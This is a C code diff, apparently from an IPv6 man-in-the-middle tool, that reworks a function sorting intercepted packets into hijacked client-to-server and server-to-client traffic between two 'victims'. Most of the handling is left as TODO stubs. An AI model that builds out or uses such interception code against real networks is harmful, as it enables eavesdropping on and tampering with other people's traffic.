@@ -102,10 +102,9 @@ void packet_action(char *packet) {
 	eth = (struct ethhdr *)packet;
 	ip6 = (struct ip6_hdr *)((char *)eth + sizeof(struct ethhdr));
 
-	if (!memcmp(&(ip6->ip6_dst), &(svictim.ipv6), sizeof(struct in6_addr))) {
-		/* Se o mac destino for o do atacante, é pacote roubado */
-		if (memcmp(&(eth->h_dest), &(device.hwaddr), ETH_ALEN) == 0) {
-			printf("Packet Hijacked? >:-)\n");
+	if (memcmp(&(eth->h_dest), &(device.hwaddr), ETH_ALEN) == 0) {
+		if (!memcmp(&(ip6->ip6_dst), &(svictim.ipv6), sizeof(struct in6_addr))) {
+			printf("Packet Hijacked from client to server? >:-)\n");
 			debug_packet(packet);
 			/* TODO */
 			switch (ip6->ip6_nxt) {
@@ -118,21 +117,23 @@ void packet_action(char *packet) {
 				default:
 					break;
 			}
-		}
-	} else if (!memcmp(&(ip6->ip6_src), &(svictim.ipv6), sizeof(struct in6_addr))) {
-		/* Pacote enviado pela nossa vitima. */
-		switch (ip6->ip6_nxt) {
-			case IPPROTO_ICMPV6:
-				icmpv6 = (struct icmp6_hdr *)((char *)ip6 + sizeof(struct ip6_hdr));
-				/* TODO */
-			break;
-			case IPPROTO_TCP:
-				tcp = (struct tcphdr *)((char *)ip6 + sizeof(struct ip6_hdr));
-				/* TODO */
-				break;
+		} else if (!memcmp(&(ip6->ip6_src), &(svictim.ipv6), sizeof(struct in6_addr))) {
+			if (!memcmp(&(ip6->ip6_dst), &(cvictim->ipv6), sizeof(struct in6_addr))) {
+				printf("Packet Hijacked from server to client? >:-)\n");
+				/* Pacote enviado pela nossa vitima. */
+				switch (ip6->ip6_nxt) {
+					case IPPROTO_ICMPV6:
+						icmpv6 = (struct icmp6_hdr *)((char *)ip6 + sizeof(struct ip6_hdr));
+						/* TODO */
+						break;
+					case IPPROTO_TCP:
+						tcp = (struct tcphdr *)((char *)ip6 + sizeof(struct ip6_hdr));
+						/* TODO */
+						break;
+				}
+			}
 		}
 	}
-
 }
 
 int main(int argc, char **argv) {
